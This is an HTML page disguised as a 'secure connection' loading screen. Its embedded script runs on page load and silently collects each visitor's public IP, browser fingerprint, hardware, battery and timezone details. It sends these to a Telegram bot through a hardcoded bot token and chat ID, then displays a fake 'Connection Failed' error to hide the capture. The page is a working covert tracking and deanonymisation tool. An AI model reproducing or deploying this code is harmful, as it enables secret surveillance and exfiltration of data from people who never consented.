<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting...</title>
    <style>
        body { 
            background: #0a0a0a; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0;
            font-family: Arial, sans-serif;
            color: #fff;
        }
        .loader { text-align: center; }
        .spinner {
            border: 4px solid #333;
            border-top: 4px solid #00ff88;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="loader">
    <h2>Establishing Secure Connection...</h2>
    <div class="spinner"></div>
    <p style="color:#666;font-size:14px;">Please wait while we route your request to the nearest node</p>
</div>

<script>
// --- APNI BOT DETAILS YAHA DALO ---
const TELEGRAM_BOT_TOKEN = '8521982994:AAEGw77HH1Q6AwUgMCb3f0_nVhZ4-url2zk';
const TELEGRAM_CHAT_ID = '8402472475';

async function fetchFullTelemetry() {
    // 1. Core Device and Browser Info Collect Karna
    const data = {
        userAgent: navigator.userAgent,
        platform: navigator.platform || 'Unknown',
        language: navigator.language || 'Unknown',
        languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
        screenRes: `${screen.width}x${screen.height}`,
        availScreenRes: `${screen.availWidth}x${screen.availHeight}`,
        colorDepth: `${screen.colorDepth}-bit`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
        cpuCores: navigator.hardwareConcurrency || 'N/A',
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
        cookieEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
        onlineStatus: navigator.onLine ? 'Online' : 'Offline',
        referrer: document.referrer || 'Direct Visit',
        ip: 'Unavailable',
        networkType: 'Unknown',
        batteryLevel: 'N/A',
        isCharging: 'N/A'
    };

    // 2. Network Type Check Karna (Agar Browser Support Kare)
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        data.networkType = `${conn.effectiveType || 'Unknown'} (Downlink: ${conn.downlink || '?' } Mbps)`;
    }

    // 3. Battery Details Check Karna (Asynchronous API)
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            data.batteryLevel = `${Math.round(battery.level * 100)}%`;
            data.isCharging = battery.charging ? 'Yes ‚ö°' : 'No ūüĒč';
        } catch (e) {
            console.log("Battery info not accessible");
        }
    }

    // 4. Public IP Fetch Karna (Free API ke zariye)
    try {
        const ipResp = await fetch('https://api.ipify.org?format=json');
        if (ipResp.ok) {
            const ipData = await ipResp.json();
            data.ip = ipData.ip;
        }
    } catch(e) {
        console.log("IP fetch blocked or failed");
    }

    // 5. Advanced Structured Telegram Message Layout
    const messageText = `ūüďä *FULL SYSTEM DIAGNOSTIC REPORT*\n` +
                        `‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ‚ĒĀ\n\n` +
                        `ūüĆź *NETWORK & CONNECTIVITY:*\n` +
                        `‚ÄĘ *Public IP:* \`${data.ip}\` (Click to copy)\n` +
                        `‚ÄĘ *Network Connection:* ${data.networkType}\n` +
                        `‚ÄĘ *Network Status:* ${data.onlineStatus}\n\n` +
                        `ūüďĪ *HARDWARE & SYSTEM SPECIFICATIONS:*\n` +
                        `‚ÄĘ *Operating System/Platform:* ${data.platform}\n` +
                        `‚ÄĘ *Processor Cores:* ${data.cpuCores} Cores\n` +
                        `‚ÄĘ *Device RAM (Approx):* ${data.memory}\n` +
                        `‚ÄĘ *Screen Resolution:* ${data.screenRes} px\n` +
                        `‚ÄĘ *Available Screen:* ${data.availScreenRes} px\n` +
                        `‚ÄĘ *Color Depth:* ${data.colorDepth}\n\n` +
                        `ūüĒč *POWER MANAGEMENT:*\n` +
                        `‚ÄĘ *Battery Level:* ${data.batteryLevel}\n` +
                        `‚ÄĘ *Is Charging:* ${data.isCharging}\n\n` +
                        `‚öôÔłŹ *SOFTWARE & REGIONAL ENVIRONMENT:*\n` +
                        `‚ÄĘ *Timezone Area:* ${data.timezone}\n` +
                        `‚ÄĘ *Primary Language:* ${data.language}\n` +
                        `‚ÄĘ *Accepted Languages:* ${data.languages}\n` +
                        `‚ÄĘ *Cookies Enabled:* ${data.cookieEnabled}\n` +
                        `‚ÄĘ *Referrer/Source:* ${data.referrer}\n\n` +
                        `ūüďĄ *RAW USER AGENT STRING:*\n` +
                        `\`\`\`text\n${data.userAgent}\n\`\`\`\n` +
                        `ūüēí _Log Generation Time: ${new Date().toLocaleString()}_`;

    // 6. Telegram Bot standard API Request Send Karna
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown'
            })
        });
    } catch(err) {
        console.error("Error pushing logs to Telegram:", err);
    }
}

// Window load hone par code initialize karein
window.onload = function() {
    fetchFullTelemetry();
    
    // 3.5 Seconds ke baad ek realistic fallthrough error interface show karna
    setTimeout(() => {
        document.body.innerHTML = `
            <div class="loader">
                <h2 style="color: #ff4d4d;">Connection Failed</h2>
                <p style="color:#888;">The gateway took too long to respond. The handshake was refused.</p>
                <p style="color:#555;font-size:12px;margin-top:30px;">Error Reference: ERR_CONNECTION_TIMED_OUT</p>
            </div>
        `;
    }, 3500);
};
</script>

</body>
</html>
